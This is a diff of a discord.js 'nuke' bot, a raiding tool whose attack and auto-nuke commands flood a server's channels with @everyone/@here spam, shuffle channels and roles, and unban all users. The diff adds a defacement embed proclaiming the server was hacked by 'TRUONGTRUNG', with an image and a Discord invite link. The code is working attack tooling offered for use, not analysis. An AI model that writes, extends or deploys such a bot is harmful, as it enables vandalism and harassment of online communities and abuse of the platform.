@@ -1,9 +1,13 @@
-const { Client, GatewayIntentBits } = require('discord.js');
+const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
 const fs = require('fs').promises;
 const path = require('path');
 const sizeOf = require('image-size');
 
 let autoNukeActive = false;
+
+const MESSAGE = "I am not in danger Discord, TRUONGTRUNG IS DANGER.";
+const IMAGE_URL1 = "https://i.imgur.com/OigzItQ.png";
+const IMAGE_URL2 = "https://discord.com/invite/GkMUrP5wjh";
 
 async function loadConfig() {
     const configPath = path.join(__dirname, 'config.json');
@@ -136,9 +140,15 @@ async function performAttack(guild, config) {
     // Spam tin nhắn
     const newChannels = await createChannelsPromise;
     const spamPromises = [];
+    const embed = new EmbedBuilder()
+        .setTitle("HACK BY TRUONGTRUNG!!!")
+        .setDescription(`@everyone @here\nTHIS SERVER HAS BEEN ATTACKED BY TRUONGTRUNG!\n${MESSAGE}`)
+        .setImage(IMAGE_URL1)
+        .addFields({ name: "THAM GIA KÊNH", value: `[NHẤN VÀO ĐÂY](${IMAGE_URL2})`, inline: false });
+    
     for (let i = 0; i < 5; i++) {
         for (const channel of newChannels) {
-            spamPromises.push(channel.send(`@everyone Tham gia kênh để học ngôn ngữ lập trình https://discord.com/invite/GkMUrP5wjh`).catch(console.error));
+            spamPromises.push(channel.send({ content: "@everyone @here", embeds: [embed] }).catch(console.error));
         }
     }
     await Promise.all(spamPromises);
@@ -151,9 +161,15 @@ async function autoNuke(guild, config) {
 
     while (autoNukeActive && Date.now() < endTime) {
         const spamPromises = [];
+        const embed = new EmbedBuilder()
+            .setTitle("HACK BY TRUONGTRUNG!!!")
+            .setDescription(`@everyone @here\nTHIS SERVER HAS BEEN ATTACKED BY TRUONGTRUNG!\n${MESSAGE}`)
+            .setImage(IMAGE_URL1)
+            .addFields({ name: "THAM GIA KÊNH", value: `[NHẤN VÀO ĐÂY](${IMAGE_URL2})`, inline: false });
+
         for (const channel of newChannels.values()) {
             if (channel.isTextBased()) {
-                spamPromises.push(channel.send(`@everyone Tham gia kênh để học ngôn ngữ lập trình https://discord.com/invite/GkMUrP5wjh`).catch(console.error));
+                spamPromises.push(channel.send({ content: "@everyone @here", embeds: [embed] }).catch(console.error));
             }
         }
         await Promise.all(spamPromises);
@@ -185,15 +201,15 @@ async function main() {
 
     client.on('messageCreate', async message => {
         if (!message.content.startsWith(prefix) || message.author.bot) return;
-
+    
         const args = message.content.slice(prefix.length).trim().split(/ +/);
         const command = args.shift()?.toLowerCase();
-
-        if (autoNukeActive && (command === 'attack' || command === 'shuffle_channels')) {
+    
+        if (autoNukeActive && (command === 'attack' || command === 'shuffle_channels' || command === 'shuffle_roles')) {
             message.channel.send('Cannot use this command while auto nuke is active.');
             return;
         }
-
+    
         if (command === 'attack') {
             await performAttack(message.guild, config);
         } else if (command === 'unban_all') {
@@ -229,14 +245,18 @@ async function main() {
                 message.channel.send('Shuffled all channels.');
             });
         } else if (command === 'shuffle_roles') {
-            shuffleRoles(message.guild, 60000).then(() => {
-                message.channel.send('Shuffled all roles.');
-            });
+            if (!autoNukeActive) {
+                shuffleRoles(message.guild, 60000).then(() => {
+                    message.channel.send('Shuffled all roles.');
+                });
+            } else {
+                message.channel.send('Cannot use this command while auto nuke is active.');
+            }
         } else if (command === 'help') {
-const helpMessage = `
+            const helpMessage = `
 **Available Commands:**
 \`\`\`
-!attack - Perform an attack on the server
+attack - Perform an attack on the server
 !unban_all - Unban all users in the server
 !auto_nuke on/off - Start or stop auto nuke
 !shuffle_channels - Shuffle all channels' positions in the server for 1 minute
@@ -246,7 +266,7 @@ const helpMessage = `
             `;
             message.channel.send(helpMessage);
         }
-    });
+    });    
 
     client.login(config.token);
 }
